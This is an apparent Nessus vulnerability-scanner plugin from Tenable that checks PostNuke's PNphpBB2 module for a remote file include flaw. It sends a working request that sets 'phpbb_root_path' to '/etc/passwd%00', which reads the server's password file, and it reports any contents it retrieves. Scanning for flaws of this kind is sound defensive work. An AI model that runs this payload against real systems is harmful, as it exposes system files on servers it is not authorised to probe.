#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to a remote
file include vulnerability. 

Description :

The installation of PostNuke on the remote host includes a version of
the PNphpBB2 module that fails to sanitize input to the
'phpbb_root_path' parameter of the 'includes/functions_admin.php'
script before using it in a PHP 'include_once()' function.  Provided
PHP's 'register_globals' setting is enabled, an unauthenticated
attacker may be able to exploit this issue to view arbitrary files or
to execute arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://forums.postnuke.com/index.php?name=PNphpBB2&file=viewtopic&t=41948
http://www.pnphpbb.com/index.php?name=PNphpBB2&file=viewtopic&t=5606

Solution :

Upgrade to PNphpBB2 version 1.2h rc3 or later.

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(21145);
  script_version("$Revision: 1.1 $");

  script_name(english:"PostNuke PNphpBB2 phpbb_root_path Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a file with PNphpBB2 Module");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("postnuke_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/postnuke"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/modules/PNphpBB2/includes/functions_admin.php?",
      "phpbb_root_path=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0includes.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening '/etc/passwd\\0includes'", string:res)
  )
  {
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
